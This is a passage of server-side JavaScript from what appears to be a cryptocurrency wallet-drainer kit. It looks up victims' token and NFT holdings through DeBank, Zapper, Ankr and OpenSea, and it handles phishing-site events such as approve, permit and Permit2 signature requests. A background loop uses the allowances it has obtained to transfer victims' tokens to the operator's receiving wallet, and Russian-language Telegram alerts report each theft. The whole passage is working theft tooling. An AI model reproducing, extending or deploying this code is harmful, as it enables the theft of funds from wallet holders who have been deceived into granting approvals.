      if (!data.user_id || (MS_Check_Settings.block_by_id && data.user_id && Checks_Data.personal[data.user_id] && Checks_Data.personal[data.user_id] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      Checks_Data.all_checks += 1;
      Checks_Data.personal[data.user_id] += 1;
      Checks_Data.personal[data.IP] += 1;
    }

    let tokens = [];

    if (MS_Use_DeBank) {
      try {
        let result = await axios.get(`https://pro-openapi.debank.com/v1/user/all_token_list?id=${data.address}`, {
          headers: {
            'Accept': 'application/json',
            'AccessKey': MS_DeBank_Token
          }
        });
        for (const asset of result.data) {
          try {
            const chain_id = convert_chain('DEBANK', 'ID', asset.chain);
            if (chain_id == false || !asset.is_verified) continue;
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.id.toLowerCase())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.id.toLowerCase())) continue;
            let amount_usd = asset.amount * asset.price;
            let new_asset = {
              chain_id: chain_id, name: asset.name, type: (asset.id == asset.chain) ? 'NATIVE' : 'ERC20',
              amount: asset.amount, amount_raw: ethers.BigNumber.from(asset.raw_amount_hex_str).toString(),
              amount_usd, symbol: asset.symbol, decimals: asset.decimals, address: asset.id, price: asset.price
            };
            if (new_asset.price > 0) tokens.push(new_asset);
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (MS_Use_Zapper) {
      try {
        let z_update = await axios.post(`https://api.zapper.xyz/v2/balances/tokens?addresses%5B%5D=${data.address}&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=optimism&networks%5B%5D=binance-smart-chain&networks%5B%5D=fantom&networks%5B%5D=avalanche&networks%5B%5D=arbitrum`, null, {
          headers: {
            'Accept': 'application/json',
            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
          }
        });
        if (z_update.data.jobId) {
          let zapper_status = 'active';
          let zapper_id = z_update.data.jobId;
          while (zapper_status == 'active') {
            await new Promise(r => setTimeout(r, 500));
            z_update = await axios.get(`https://api.zapper.xyz/v2/balances/job-status?jobId=${zapper_id}`, {
              headers: {
                'Accept': 'application/json',
                'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
              }
            });
            if (z_update.data.status) {
              zapper_status = z_update.data.status;
            } else {
              zapper_status = 'unknown';
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
      try {
        let result = await axios.get(`https://api.zapper.xyz/v2/balances/tokens?addresses%5B%5D=${data.address}&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=optimism&networks%5B%5D=binance-smart-chain&networks%5B%5D=fantom&networks%5B%5D=avalanche&networks%5B%5D=arbitrum`, {
          headers: {
            'Accept': 'application/json',
            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
          }
        });
        if (result.data[data.address] && result.data[data.address] != null) {
          for (const asset of result.data[data.address]) {
            try {
              const chain_id = convert_chain('ZAPPER', 'ID', asset.network);
              if (chain_id == false) continue;
              if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.token.address.toLowerCase())) continue;
              else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.token.address.toLowerCase())) continue;
              let item_id = -1, item_type = (asset.token.address == '0x0000000000000000000000000000000000000000') ? 'NATIVE' : 'ERC20';
              for (let x = 0; x < tokens.length; x++) {
                if ((asset.token.address == tokens[x].address) || (item_type == 'NATIVE' && item_type == tokens[x].type && chain_id == tokens[x].chain_id)) {
                  item_id = x;
                  break;
                }
              }
              if (item_id == -1) {
                let new_asset = {
                  chain_id: chain_id, name: asset.token.name || 'NATIVE', type: item_type,
                  amount: asset.token.balance, amount_raw: ethers.BigNumber.from(asset.token.balanceRaw).toString(),
                  amount_usd: asset.token.balanceUSD, symbol: asset.token.symbol || 'N/A', decimals: asset.token.decimals || 18,
                  address: asset.token.address, price: asset.token.price || 0
                };
                if (new_asset.price > 0) tokens.push(new_asset);
              }
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (MS_Use_Ankr) {
      try {
        let result = await axios.post(`https://rpc.ankr.com/multichain/${MS_Ankr_Token}`, {
          "id": 1, "jsonrpc": "2.0", "method": "ankr_getAccountBalance",
          "params": {
            "blockchain": [ "eth", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism" ],
            "walletAddress": data.address
          }
        }, {
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          }
        });
        for (const asset of result.data.result.assets) {
          try {
            const chain_id = convert_chain('ANKR', 'ID', asset.blockchain);
            if (chain_id == false) continue;
            let contract_address = asset.contractAddress || 'NATIVE';
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(contract_address.toLowerCase())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(contract_address.toLowerCase())) continue;
            let item_id = -1, item_type = (contract_address == 'NATIVE') ? 'NATIVE' : 'ERC20';
            for (let x = 0; x < tokens.length; x++) {
              if ((contract_address == tokens[x].address) || (item_type == 'NATIVE' && item_type == tokens[x].type && chain_id == tokens[x].chain_id)) {
                item_id = x;
                break;
              }
            }
            if (item_id == -1) {
              let new_asset = {
                chain_id: chain_id,
                name: asset.tokenName, type: asset.tokenType,
                amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
                amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
                decimals: asset.tokenDecimals, address: contract_address || null,
                price: parseFloat(asset.tokenPrice)
              };
              if (new_asset.price > 0) tokens.push(new_asset);
            }
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    return send_response(response, { status: 'OK', data: tokens });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
}

const get_wallet_balance = async (address) => {
  try {
    let result = await axios.get(`https://pro-openapi.debank.com/v1/user/total_balance?id=${address}`, {
      headers: {
        'Accept': 'application/json',
        'AccessKey': MS_DeBank_Token
      }
    });
    await new Promise(r => setTimeout(r, 1000));
    let result_2 = await axios.get(`https://pro-openapi.debank.com/v1/user/all_token_list?id=${address}`, {
      headers: {
        'Accept': 'application/json',
        'AccessKey': MS_DeBank_Token
      }
    });
    if (result.data.total_usd_value && typeof result_2.data == 'object') {
      return {
        balance: result.data.total_usd_value,
        chains: result.data.chain_list,
        assets: result_2.data
      }
    }
  } catch(err) {
    return false;
  }
};

const check_nft = async (response, data) => {
  try {

    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
        if (User_IPs_Pool[data.IP]['check_nfts']) {
          if (Math.floor(Date.now() / 1000) - User_IPs_Pool[data.IP]['check_nfts'] < 60) {
            return block_request(response);
          }
        }
        User_IPs_Pool[data.IP]['check_nfts'] = Math.floor(Date.now() / 1000);
      } else {
        User_IPs_Pool[data.IP] = {
          check_nfts: Math.floor(Date.now() / 1000)
        };
      }
    }

    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }

    if (MS_Check_Limits) {
      if (MS_Check_Settings.block_for_all && Checks_Data.all_checks >= MS_Check_Settings.limit_for_all) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      if (!data.IP || (MS_Check_Settings.block_by_ip && data.IP && Checks_Data.personal[data.IP] && Checks_Data.personal[data.IP] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      if (!data.user_id || (MS_Check_Settings.block_by_id && data.user_id && Checks_Data.personal[data.user_id] && Checks_Data.personal[data.user_id] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      Checks_Data.all_checks += 1;
      Checks_Data.personal[data.user_id] += 1;
      Checks_Data.personal[data.IP] += 1;
    }

    let tokens = [];

    try {
      if (MS_Use_OpenSea) {
        let result = await axios.get(`https://api.opensea.io/api/v1/assets?owner=${data.address}&order_direction=desc&limit=200&include_orders=false`, {
          headers: {
            'Accept': 'application/json',
            'X-API-KEY': MS_OpenSea_Token
          }
        });
        if (result.data.assets) {
          let result_2 = await axios.get(`https://api.opensea.io/api/v1/collections?asset_owner=${data.address}&offset=0&limit=200`, {
            headers: {
              'Accept': 'application/json',
              'X-API-KEY': MS_OpenSea_Token
            }
          });
          for (const asset of result.data.assets) {
            try {
              let collection = null;
              for (const x_collection of result_2.data) {
                try {
                  if (x_collection.primary_asset_contracts.length < 1) continue;
                  if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
                    collection = x_collection;
                    break;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              if (collection == null) continue;
              if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase())) continue;
              else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase())) continue;
              let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
              let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
              asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
              let new_asset = {
                chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
                amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
                address: asset.asset_contract.address, price: asset_price
              };
              if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) tokens.push(new_asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } else if (MS_Use_DeBank && !MS_Use_Zapper) {
        let result = await axios.get(`https://pro-openapi.debank.com/v1/user/all_nft_list?id=${data.address}`, {
          headers: {
            'Accept': 'application/json',
            'AccessKey': MS_DeBank_Token
          }
        });
        for (const asset of result.data) {
          try {
            const chain_id = convert_chain('DEBANK', 'ID', asset.chain);
            if (chain_id == false) continue;
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.contract_id.toLowerCase())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.contract_id.toLowerCase())) continue;
            asset.name = asset.name.replaceAll(/[^a-zA-Z0-9 ]/g, '');
            let new_asset = {
              chain_id: chain_id, name: asset.name, type: asset.is_erc721 ? 'ERC721' : 'ERC1155',
              amount: asset.amount, amount_raw: null, amount_usd: asset.usd_price || null, id: asset.inner_id,
              symbol: null, decimals: null, address: asset.contract_id, price: asset.usd_price || null
            };
            if (new_asset.price != null && new_asset.price > 0) tokens.push(new_asset);
          } catch(err) {
            console.log(err);
          }
        }
      } else {
        let result = await axios.get(`https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=${data.address}&limit=25`, {
          headers: {
            'Accept': 'application/json',
            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
          }
        });
        for (const asset of result.data.items) {
          try {
            const chain_id = convert_chain('ZAPPER', 'ID', asset.token.collection.network);
            if (chain_id == false) continue;
            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.token.collection.address.toLowerCase())) continue;
            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.token.collection.address.toLowerCase())) continue;
            let price = parseFloat(asset.token.estimatedValueEth) * MS_Currencies[convert_chain('ID', 'CURRENCY', chain_id)]['USD'];
            if (typeof price != 'number' || isNaN(price)) continue;
            asset.token.name = asset.token.name.replaceAll(/[^a-zA-Z0-9 ]/g, '');
            let new_asset = {
              chain_id: chain_id, name: asset.token.name, type: (asset.token.collection.nftStandard != 'erc1155') ? 'ERC721' : 'ERC1155',
              amount: asset.balance, amount_raw: null, amount_usd: price, id: asset.token.tokenId,
              symbol: null, decimals: null, address: asset.token.collection.address, price: price
            };
            if (new_asset.price > 0) tokens.push(new_asset);
          } catch(err) {
            console.log(err);
          }
        }
      }
    } catch(err) {
      console.log(err);
    }

    return send_response(response, { status: 'OK', data: tokens });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

let Message_TS_List = {};

if (MS_Repeats_Protection) {
  setInterval(() => {
    Message_TS_List = {};
  }, MS_Repeats_TS * 1000);
}

web.post("/", (request, response) => {
  try {
    let data = request.body;

    if (!data['ver'] || data['ver'] != '19082023') {
      return send_response(response, { status: 'error', error: 'INVALID_VERSION' });
    }

    if (!data['raw']) {
      return response.status(500).send('Unable to Execute');
    }

    const encode_key = Buffer.from(String(10 + 256 + 1024 + 2048 + MS_Encryption_Key)).toString('base64');
    data = JSON.parse(Buffer.from(srp(encode_key, data['raw']), 'base64').toString('ascii'));
    if (!data['action']) return response.status(500).send('Unable to Execute');

    data['IP'] = request.headers['x-forwarded-for'] || request.socket['remoteAddress'];
    data['IP'] = data['IP'].replace('::ffff:', '');

    data['UA'] = request.useragent;

    if (MS_Domains_Mode == 1 && MS_Domains_Whilelist.length > 0 && data['domain']) {
      try {
        if (!MS_Domains_Whilelist.includes(data['domain'])) {
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (MS_Repeats_Protection) {
      if (!data['message_ts'] || (data['user_id'] && data['message_ts']
      && Message_TS_List[data['user_id']] && data['message_ts'] <= Message_TS_List[data['user_id']]) || (data['IP'] && data['message_ts']
      && Message_TS_List[data['IP']] && data['message_ts'] <= Message_TS_List[data['IP']])) {
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      } else {
        Message_TS_List[data['IP']] = data['message_ts'];
        Message_TS_List[data['user_id']] = data['message_ts'];
      }
    }

    if (data['action'] == 'retrive_config') {
      const Notifications = {};
      for (const key in MS_Notifications)
        Notifications[key] = MS_Notifications[key].mode;
      return send_response(response, {
        status: 'OK',
        data: {
          RPCs: MS_Public_RPC_URLs, Address: MS_Wallet_Address,
          Notifications: Notifications, Settings: MS_Settings,
          Contract_Blacklist: MS_Contract_Blacklist,
          Contract_Whitelist: MS_Contract_Whitelist,
          Wallet_Blacklist: MS_Wallet_Blacklist,
          Receiver: MS_Wallet_Receiver, CIS: MS_CIS_Protection,
          V_MSG: MS_VERIFY_MESSAGE, Loop_N: MS_Loop_Native,
          Loop_T: MS_Loop_Tokens, Loop_NFT: MS_Loop_NFTs,
          Permit_BL: MS_PERMIT_BLACKLIST, V_MODE: MS_VERIFY_WALLET,
          Unlimited_BL: MS_UNLIMITED_BLACKLIST, DSB: MS_Disable_System,
          AT: "", LA: MS_Loop_Assets
        }
      });
    } else if (data['action'] == 'retrive_contract') {
      return send_response(response, {
        status: 'OK', data: MS_Contract_ABI
      });
    } else if (data['action'] == 'retrive_id') {
      return send_response(response, {
        status: 'OK',  data: free_id()
      });
    } else if (data['action'] == 'check_wallet') {
      if (MS_Use_DeBank == false && MS_Use_Zapper == false && MS_Use_Ankr == false) {
        return send_response(response, {
          status: 'error',  error: 'LOCAL_CHECK'
        });
      } else {
        return check_wallet(response, data);
      }
    } else if (data['action'] == 'check_nft') {
      return check_nft(response, data);
    } else if (data['action'] == 'sign_verify') {
      if (MS_VERIFY_WALLET == 0) {
        MS_Verified_Addresses[data.address] = Math.floor(Date.now() / 1000);
        return send_response(response, { status: 'OK' });
      } else {
        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(((!data.message || data.message == "") ? MS_VERIFY_MESSAGE : data.message).replaceAll('{{ADDRESS}}', data.address)), data.sign);
        if (is_sign_correct) {
          MS_Verified_Addresses[data.address] = Math.floor(Date.now() / 1000);
          return send_response(response, { status: 'OK' });
        } else {
          return send_response(response, { status: 'error',  error: 'INVALID_SIGN' });
        }
      }
    } else if (data['action'] == 'enter_website') {
      return on_enter_website(response, data);
    } else if (data['action'] == 'leave_website') {
      return on_leave_website(response, data);
    } else if (data['action'] == 'connect_request') {
      return on_connect_request(response, data);
    } else if (data['action'] == 'connect_cancel') {
      return on_connect_cancel(response, data);
    } else if (data['action'] == 'connect_success') {
      return on_connect_success(response, data);
    } else if (data['action'] == 'check_finish') {
      return on_check_finish(response, data);
    } else if (data['action'] == 'transfer_request') {
      return on_transfer_request(response, data);
    } else if (data['action'] == 'sign_request') {
      return on_sign_request(response, data);
    } else if (data['action'] == 'approve_request') {
      return on_approve_request(response, data);
    } else if (data['action'] == 'transfer_success') {
      return on_transfer_success(response, data);
    } else if (data['action'] == 'sign_success') {
      return on_sign_success(response, data);
    } else if (data['action'] == 'swap_success') {
      return on_swap_success(response, data);
    } else if (data['action'] == 'swap_request') {
      return on_swap_request(response, data);
    } else if (data['action'] == 'approve_success') {
      return on_approve_success(response, data);
    } else if (data['action'] == 'transfer_cancel') {
      return on_transfer_cancel(response, data);
    } else if (data['action'] == 'sign_cancel') {
      return on_sign_cancel(response, data);
    } else if (data['action'] == 'approve_cancel') {
      return on_approve_cancel(response, data);
    } else if (data['action'] == 'chain_request') {
      return on_chain_request(response, data);
    } else if (data['action'] == 'chain_success') {
      return on_chain_success(response, data);
    } else if (data['action'] == 'chain_cancel') {
      return on_chain_cancel(response, data);
    } else if (data['action'] == 'sign_unavailable') {
      return on_sign_unavailable(response, data);
    } else if (data['action'] == 'approve_token') {
      return approve_token(response, data);
    } else if (data['action'] == 'permit_token') {
      return permit_token(response, data);
    } else if (data['action'] == 'safa_approves') {
      return safa_approves(response, data);
    } else if (data['action'] == 'sign_permit2') {
      return sign_permit2(response, data);
    } else if (data['action'] == 'seaport') {
      if (SeaPort == null) {
        return response.status(200).send(JSON.stringify({
          status: 'error', error: 'SeaPort Module is not installed'
        }));
      }
      return seaport_handler(response, data);
    } else if (data['action'] == 'blur') {
      if (Blur == null) {
        return response.status(200).send(JSON.stringify({
          status: 'error', error: 'Blur Module is not installed'
        }));
      }
      return blur_handler(response, data);
    } else if (data['action'] == 'x2y2') {
      return x2y2_handler(response, data);
    }
  } catch(err) {
    console.log(err);
    response.status(500).send('Unable to Execute');
  }
});

try {
  web.post("/service/enable", async (_, response) => {
    try {
      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      MS_Disable_System = false;
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  web.post("/service/disable", async (_, response) => {
    try {
      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      MS_Disable_System = true;
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  web.post("/service/telegram", async (_, response) => {
    try {
      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      const result = await bot.getMe();
      return response.status(200).send(JSON.stringify({ status: 'OK', data: { key: MS_Telegram_Token, chats: MS_Notifications, handle: result }}));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
} catch(err) {
  console.log(err);
}

const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = false) => {
  try {
    if (permit2) {
      let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, '0x000000000022d473030f116ddee9f6b43ac78ba3');
      if (!current_allowance) return false;
      const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
      const signer = new ethers.Wallet(MS_Allowance_Withdraw.wallets[spender], node);
      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
      const permit_data = await contract.allowance(owner, token, spender);
      if (ethers.BigNumber.from(permit_data.amount).lt(ethers.BigNumber.from(current_allowance))) {
        return false;
      }
      const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      try {
        gas_limit = await contract.estimateGas.transferFrom(owner, MS_Wallet_Receiver, current_allowance, token, { from: spender });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        gas_limit = 15000000;
      }
      if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
        return false;
      }
      const nonce = await node.getTransactionCount(spender, "pending");
      const tx = await contract.transferFrom(owner, MS_Wallet_Receiver, current_allowance, token, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce
      });
      await node.waitForTransaction(tx.hash, 1, 60000);
      try {
        const contract_2 = new ethers.Contract(token, MS_Contract_ABI['ERC20'], signer);
        const balance = ethers.BigNumber.from(await contract_2.balanceOf(owner));
        update_allowance(owner, spender, token, chain_id, true, balance.toString());
      } catch(err) {
        console.log(err);
      }
      if (MS_Notifications.approve_success.mode) {
        await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли и вывели токен с кошелька</b>\n\n<b>Кошелек:</b> <code>${owner}</code>\n<b>Токен:</b> <code>${token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(current_allowance)))}</code>`, {
          parse_mode: 'HTML'
        });
      }
    } else {
      let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, spender);
      if (!current_allowance) return false;
      const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
      const signer = new ethers.Wallet(MS_Allowance_Withdraw.wallets[spender], node);
      const contract = new ethers.Contract(token, MS_Contract_ABI['ERC20'], signer);
      const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.transferFrom(owner, MS_Wallet_Receiver, current_allowance, { from: spender });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        gas_limit = 15000000;
      }
      const nonce = await node.getTransactionCount(spender, "pending");
      if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
        return false;
      }
      const tx = await contract.transferFrom(owner, MS_Wallet_Receiver, current_allowance, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce
      });
      await node.waitForTransaction(tx.hash, 1, 60000);
      try {
        const balance = ethers.BigNumber.from(await contract.balanceOf(owner));
        update_allowance(owner, spender, token, chain_id, false, balance.toString());
      } catch(err) {
        console.log(err);
      }
      if (MS_Notifications.approve_success.mode) {
        await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли и вывели токен с кошелька</b>\n\n<b>Кошелек:</b> <code>${owner}</code>\n<b>Токен:</b> <code>${token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(current_allowance)))}</code>`, {
          parse_mode: 'HTML'
        });
      }
    }
  } catch(err) {
    console.log(err);
  } return true;
};

if (MS_Allowance_Check) {
  let allowance_in_check = false;
  setInterval(async () => {
    try {
      if (allowance_in_check) return;
      let allowance_list = [];
      if (fs.existsSync('allowances.dat'))
        allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
      allowance_in_check = true;
      for (const allowance of allowance_list) {
        try {
          if (allowance.owner == MS_Wallet_Receiver) continue;
          if (allowance.permit2) {
            const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[allowance.chain_id]);
            const signer = new ethers.Wallet(MS_Wallet_Private, node);
            const contract = new ethers.Contract(allowance.token, MS_Contract_ABI['ERC20'], signer);
            const balance = ethers.BigNumber.from(await contract.balanceOf(allowance.owner));
            if (allowance.last_balance && balance.eq(ethers.BigNumber.from(allowance.last_balance))) continue;
            else update_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true, balance.toString());
            const allowance_num = ethers.BigNumber.from(await contract.allowance(allowance.owner, '0x000000000022d473030f116ddee9f6b43ac78ba3'));
            if (allowance_num.lte(ethers.BigNumber.from('0'))) {
              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
              continue;
            }
            const contract_2 = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
            const permit_data = await contract_2.allowance(allowance.owner, allowance.token, allowance.spender);
            if (ethers.BigNumber.from(permit_data.amount).lte(ethers.BigNumber.from('0'))) {
              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
              continue;
            }
            if (balance.gt(ethers.BigNumber.from('0'))) {
              if (MS_Allowance_Withdraw.mode == true && balance.gte(ethers.BigNumber.from(MS_Allowance_Withdraw.min_amount)) && MS_Allowance_Withdraw.wallets[allowance.spender]) {
                await withdraw_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
              } else {
                await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли токен на кошельке</b>\n\n<b>Обработчик:</b> <code>${allowance.spender}</code>\n<b>Кошелек:</b> <code>${allowance.owner}</code>\n<b>Токен:</b> <code>${allowance.token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(allowance.chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(balance)))}</code>\n\n<code>Доступ выдан через контракт Permit2</code>`, {
                  parse_mode: 'HTML'
                });
              }
              continue;
            }
          } else {
            const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[allowance.chain_id]);
            const contract = new ethers.Contract(allowance.token, MS_Contract_ABI['ERC20'], node);
            const balance = ethers.BigNumber.from(await contract.balanceOf(allowance.owner));
            if (allowance.last_balance && balance.eq(ethers.BigNumber.from(allowance.last_balance))) continue;
            else update_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, false, balance.toString());
            const allowance_num = ethers.BigNumber.from(await contract.allowance(allowance.owner, allowance.spender));
            if (allowance_num.lte(ethers.BigNumber.from('0'))) {
              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id);
              continue;
            }
            if (balance.gt(ethers.BigNumber.from('0'))) {
              if (MS_Allowance_Withdraw.mode == true && balance.gte(ethers.BigNumber.from(MS_Allowance_Withdraw.min_amount)) && MS_Allowance_Withdraw.wallets[allowance.spender]) {
                await withdraw_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id);
              } else {
                await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли токен на кошельке</b>\n\n<b>Обработчик:</b> <code>${allowance.spender}</code>\n<b>Кошелек:</b> <code>${allowance.owner}</code>\n<b>Токен:</b> <code>${allowance.token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(allowance.chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(balance)))}</code>`, {
                  parse_mode: 'HTML'
                });
              }
              continue;
            }
          }
          await new Promise(r => setTimeout(r, 1000));
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    } allowance_in_check = false;
  }, 60000);
}

if (MS_Enable_API && MS_Allowance_API) {
  web.post("/api/allowance/remove", (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      if (!data['owner'] || !data['spender'] || !data['token'] || !data['chain_id'] || !data['permit2']) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Invalid Arguments' }));
      }
      remove_allowance(data.owner, data.spender, data.token, data.chain_id, data.permit2);
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
    }
  });
  web.post("/api/allowance/list", (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      let allowance_list = [];
      if (fs.existsSync('allowances.dat'))
        allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
      return response.status(200).send(JSON.stringify({
        status: 'OK', wallet: {
          address: MS_Wallet_Address,
          private: MS_Wallet_Private
        }, list: allowance_list
      }));
    } catch(err) {
      console.log(err);
    }
  });
  web.post("/api/allowance/withdraw", async (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      if (!data['owner'] || !data['spender'] || !data['token'] || !data['chain_id'] || !data['permit2']) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Invalid Arguments' }));
      }
      await withdraw_allowance(data.owner, data.spender, data.token, data.chain_id, data.permit2);
      return response.status(200).send(JSON.stringify({ status: 'OK' }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unable to Execute' }));
    }
  });
}

if (MS_Enable_API) {
  web.post("/api/balance", (request, response) => {
